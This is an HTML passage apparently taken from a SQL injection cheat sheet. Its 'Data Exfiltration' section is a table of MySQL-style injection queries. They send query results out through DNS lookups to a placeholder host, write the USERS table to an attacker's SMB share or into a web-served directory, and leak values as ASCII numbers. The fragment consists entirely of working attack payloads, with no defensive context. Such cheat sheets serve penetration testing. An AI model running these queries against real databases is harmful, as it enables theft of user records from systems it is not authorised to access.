<h3 id="data-exfiltration">Data Exfiltration</h3>


<p class="pageDescription">{{site.data.injectionDescriptions.dataExfiltration}}</p>

<p>* Requires privileged user</p>
<table class="table table-striped table-hover">
<thead>
<tr>
  <th>Description</th>
  <th align="left">Query</th>
</tr>
</thead>
<tbody><tr>
  <td>DNS Request</td>
  <td>SELECT LOAD_FILE(concat('\\\\',(<strong>QUERY_WITH_ONLY_ONE_ROW</strong>), '.yourhost.com\\'))</td>
</tr>
<tr>
  <td>SMB Share</td>
  <td>SELECT * FROM USERS INTO OUTFILE '\\attacker\SMBshare\output.txt'</td>
</tr>
<tr>
  <td>HTTP Server</td>
  <td>SELECT * FROM USERS INTO OUTFILE '/var/www/html/output.txt'</td>
</tr>
<tr>
  <td>Numeric Concatenation</td>
  <td>SELECT length(user())<br>SELECT ASCII(substr(user(),1)) <br><br><em>When data can only be exported as numbers, convert to ASCII.  For automation see <a target="_blank" rel="noopener" href="http://zombiehelp54.blogspot.ro/2017/02/sql-injection-in-update-query-bug.html?m=1">here</a>.</em></td>
</tr>
</tbody></table>
